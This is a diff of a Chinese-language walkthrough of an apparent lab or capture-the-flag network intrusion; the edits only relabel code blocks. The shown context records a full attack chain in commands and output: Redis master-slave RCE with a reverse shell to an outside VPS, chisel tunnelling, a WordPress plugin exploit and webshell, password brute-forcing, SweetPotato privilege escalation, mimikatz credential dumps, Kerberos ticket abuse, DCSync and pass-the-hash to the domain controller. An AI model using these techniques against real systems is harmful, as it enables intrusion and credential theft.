@@ -24,7 +24,7 @@ Tags
 
 使用 `fscan` 对入口点进行扫描
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ ./tools/fscan-1.8.4/fscan -h 39.98.113.15
 39.98.113.15:21 open
@@ -49,7 +49,7 @@ start vulscan
 
 在 vps 上建立一个恶意服务器构建 Rsdis 主从复制 RCE 执行 Reverse Shell
 
-```shell
+```bash
 root@jmt-projekt:~/redis-rogue-server# ./redis-rogue-server.py --rhost 39.98.113.15 --lhost 139.*.*.*
 ______         _ _      ______                         _____
 | ___ \       | (_)     | ___ \                       /  ___|
@@ -78,7 +78,7 @@ Reverse server port: 9999
 
 执行成功后收到反连 shell
 
-```shell
+```bash
 root@jmt-projekt:~# pwncat-cs -lp 9999
 [13:43:11] Welcome to pwncat 🐈!
 [13:49:16] received connection from 39.98.113.15:53840
@@ -99,7 +99,7 @@ redis
 
 由于权限限制，需要提权到 root 用户才能读取 flag，尝试扫描 suid 特权文件并借此提权
 
-```shell
+```bash
 (remote) redis@centos-web01:/home/redis/flag$ find / -perm -u=s -type f 2>/dev/null
 /usr/sbin/pam_timestamp_check
 /usr/sbin/usernetctl
@@ -157,7 +157,7 @@ flag01: flag{c9a177cc-f8c5-4077-91c6-c8d57609fc57}
 
 鉴于使用 `pwncat-cs` 建立了立足点，传入 `fscan`
 
-```shell
+```bash
 (remote) redis@centos-web01:/usr/local/redis/db$ cd /tmp
 (remote) redis@centos-web01:/tmp$
 (local) pwncat$ upload fscan_amd64.1
@@ -228,14 +228,14 @@ start vulscan
 
 使用 `chisel` 进行代理搭建，上传 `chisel` 之后，在入口点靶机建立 `chisel` 客户端转发内网
 
-```shell title="vps"
+```bash title="vps"
 root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 2024/07/23 14:00:40 server: Reverse tunnelling enabled
 2024/07/23 14:00:40 server: Fingerprint ulX3QeMY7bHkUtrqjPTyx5ODV4RBSXZHv93CM6ZH9YQ=
 2024/07/23 14:00:40 server: Listening on http://0.0.0.0:1337
 ```
 
-```shell title="入口点靶机"
+```bash title="入口点靶机"
 (remote) redis@centos-web01:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10001:socks
 2024/07/23 14:01:12 client: Connecting to ws://139.*.*.*:1337
 2024/07/23 14:01:12 client: Connected (Latency 44.864109ms)
@@ -243,7 +243,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 成功建立 socks 代理
 
-```shell title="vps"
+```bash title="vps"
 root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 2024/07/23 14:00:40 server: Reverse tunnelling enabled
 2024/07/23 14:00:40 server: Fingerprint ulX3QeMY7bHkUtrqjPTyx5ODV4RBSXZHv93CM6ZH9YQ=
@@ -255,7 +255,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 使用 `wpscan` 进行扫描
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools/chisel-v1.9.1]
 └─$ wpscan --no-update --proxy socks5://139.*.*.*:10001 --url http://172.22.2.18/
 [i] Plugin(s) Identified:
@@ -276,7 +276,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 上传 Webshell
 
-```shell
+```bash
 ┌──(env)(randark ㉿ kali)-[~/pocs/CVE-2021-25003]
 └─$ proxychains4 python3 WpCargo.py -t http://172.22.2.18/
 [proxychains] config file found: /etc/proxychains4.conf
@@ -295,7 +295,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 尝试利用
 
-```shell
+```bash
 ┌──(env)(randark ㉿ kali)-[~/pocs/CVE-2021-25003]
 └─$ proxychains4 http -f post "http://172.22.2.18/wp-content/wp-conf.php?1=system" "2=whoami" --output /tmp/output.txt; strings /tmp/output.txt
 [proxychains] config file found: /etc/proxychains4.conf
@@ -325,7 +325,7 @@ IEND
 
 :::
 
-```shell
+```bash
 root@jmt-projekt:~# pwncat-cs -lp 8888
 [15:21:49] Welcome to pwncat 🐈!
 [15:22:36] received connection from 127.0.0.1:51530
@@ -380,7 +380,7 @@ define('DB_HOST', '127.0.0.1');
 
 尝试连接数据库
 
-```shell
+```bash
 (remote) www-data@ubuntu-web02:/var/www/html$ mysql -u wpuser -p
 Enter password:
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -439,7 +439,7 @@ flag{c757e423-eb44-459c-9c63-7625009910d8}
 
 使用上面得到的密码，对 mssql 进行爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/Yunjing-Brute4Road]
 └─$ proxychains4 -q hydra -l sa -P pwd-dbs.txt mssql://172.22.2.16
 [DATA] attacking mssql://172.22.2.16:1433/
@@ -448,7 +448,7 @@ flag{c757e423-eb44-459c-9c63-7625009910d8}
 
 建立将 `172.22.2.16:1443(mssql)` -> `vps:1003` 的代理
 
-```shell title="入口机"
+```bash title="入口机"
 (remote) redis@centos-web01:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:10003:172.22.2.16:1433
 2024/07/23 16:10:31 client: Connecting to ws://139.*.*.*:1337
 2024/07/23 16:10:31 client: Connected (Latency 44.571643ms)
@@ -466,7 +466,7 @@ flag{c757e423-eb44-459c-9c63-7625009910d8}
 
 激活 `Ole` 组件之后，上传 `SweetPotato.exe` 至 `C:/Users/Public/Downloads/` 之后，尝试执行
 
-```shell
+```bash
 > C:/Users/Public/Downloads/SweetPotato.exe -a "whoami"
 
 Modifying SweetPotato by Uknow to support webshell
@@ -496,7 +496,7 @@ nt authority\system
 
 借此，直接创建用户
 
-```shell
+```bash
 net user randark admin123 /add
 net localgroup administrators randark /add
 ```
@@ -527,7 +527,7 @@ flag03: flag{4dccd425-6395-49ed-9c1e-47d73f9c8623}
 
 由于没有安全措施，所以可以直接上传 `mimikatz`
 
-```shell
+```bash
 mimikatz # log
 Using 'mimikatz.log' for logfile : OK
 
@@ -539,7 +539,7 @@ Privilege '20' OK
 
 <summary> mimikatz # sekurlsa::logonpasswords </summary>
 
-```shell
+```bash
 mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 6718750 (00000000:0066851e)
@@ -1563,7 +1563,7 @@ SID               : S-1-5-90-0-2
 
 申请 `MSSQLSERVER$` 用户的 TGT
 
-```shell
+```bash
 PS C:\Users\randark\Desktop> .\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:302393922f8920b52b9724a8e3d735bb /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
 ______        _
 (_____ \      | |
@@ -1594,7 +1594,7 @@ ASREP (key)              :  302393922F8920B52B9724A8E3D735BB
 
 获取到 TGT 之后，请求对 LDAP 域控的票据
 
-```shell
+```bash
 PS C:\Users\randark\Desktop> .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3xYlFPMuxg+URvDENLbnsYToalRMBIQv3+wPp0mmlPG1P3VOYTrGrN6n9N9Pz3WSDnqFESdC98yPX8orXx+fVrC3B8Nha8rPTGt2L68RjvHPz7ruEOLWfaugwmF4sgUJVdYiAGVUl/w/mR5O++dJy3iM3qD+PRoDEKgMAY+Prwwl+lh3uu8vV+FlxAG/LH9+artYi+OFHOiPZge+B9hTtUWVub4vOANOKsVr3MXuXWb4OCU6Ge48BkH5Y8KOFVVO+OE851Cfj8oU6Z0JIpxNG3GbLmE5RYv6yRQ/rkuS5QYugygc82QJ33nBRlspqV3zWc8ELmG4rku/bFTtH1Tc/w7E4wGxOmtwjEQQZOduvlaYk2L4XpcdXFAPCcPA9V9ygDmeXYk44Ug4Lp+SzN80W1hdT74+j9cQ5jTGgxo0fwzTtPi0sWez8V9L1jSn141G/dmL0t/872BbGaaadl+jMlnWHQQdaNjjONNvgaknIru8tpnl6KX3UAzpfKkqnqbFRIdGPUibu2n9JRKWSU2FpqXGQ+WfvEgi5i8H083oz/d64old9vCKFCV05QPvSQojJy5D/fE2YOab6ghIt5dwVEHYjYoj06Q47fyRZp0fdYwab0JnPoslmYuAph5yTF5kC9qfxSElk4lp72cs/AmMvZ75I0unII120QKYSiJik+LiIsbqLC5G+jNh13J2twk+XAVcm1fP6uycGNz7tr6u/Pvj4dgbKYpqoEvbDHrAjj/u7qG/wXHuMuaSVGB8t16d6QhhmdXyeyw6ThPIen0+eNN9y15749MEVWq/ONfQb2eyxSgesVi77x5aCdNnKqc70Joik1v/IgDfdrE4kus94wCZ8l5NcnDGmM/QMwrJK4dDpRq3YCwQX9TqoTJA74HcaOOgRxytQohHQCWRcct4c7w5sRMxkmX0qbO3MuHq5n6Jafrzo7jc7ZuH+ft/XoPHqgBcLFh7Mv4lObktLi60E5C7fwgHuQSYEAoGTz+bv8XfbC+YslucIQOruTGKrQQhfeYnraSOMHy5eHwOL3I3zeD2GUPGye4RUnsXpG7QlkdMkxyV9nl7nQAb6AwlBXq87EyzDhaBz0wUZOH+n2tI5Yru4LjAr3MuV/PUZg2BjsfKCBwKKhC24qwBAWCV0zssuqLecqFwqyGcZidETlqFh8sNDbq9MPn8pZIVth87duyuOPmpgCkdpObU6fjZ+lHpqWab2TgQj/2UCyvzqIDF5RJsKACtrrNXLvKGaE7TFMMsY/JGI6866s+e8DmnG/RdOGGSbLykEk/muZ1rDBzsoGafQTtAES5eB0MlbC3+eDJlJ3rLM+4ap8zSzm/wIPAsDzIAU3Lpv9IELbwdESsqBVun6xRaTmGFsxg+pt3zjv59McFcduKzBhAZMpedFauvMpQt7K1tFj8jxCvYEkIkrnmfXf3boRC9scJAa1s2+AhRf3LuLWD/PVR/xX5FqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBD9PJUn8/+BepPyM2/eCaZioQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDcyMzA5MDc0MlqmERgPMjAyNDA3MjMxOTA3NDJapxEYDzIwMjQwNzMwMDkwNzQyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
 
    ______        _
@@ -1684,7 +1684,7 @@ PS C:\Users\randark\Desktop> .\Rubeus.exe s4u /impersonateuser:Administrator /ms
 
 票据导入到本地，得到 LDAP 服务的权限之后，借助 LDAP 服务的 DCSync 权限，获取到域内用户的哈希
 
-```shell
+```bash
 mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:Administrator
 [DC] 'xiaorang.lab' will be the domain
 [DC] 'DC.xiaorang.lab' will be the DC server
@@ -1766,7 +1766,7 @@ Supplemental Credentials:
 
 ## 172.22.2.3 DC SMB-exec
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/Yunjing-Brute4Road]
 └─$ proxychains4 crackmapexec smb 172.22.2.3 -u administrator -H1a19251fbd935969832616366ae3fe62 -d xiaorang.lab -x "type Users\Administrator\flag\flag04.txt"
 [proxychains] config file found: /etc/proxychains4.conf
@@ -1803,7 +1803,7 @@ SMB         172.22.2.3      445    DC               flag04: flag{aee9f5e2-5fe3-4
 
 ## 172.22.2.3 DC WMI 横向
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/Yunjing-Brute4Road]
 └─$ proxychains4 -q impacket-wmiexec -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
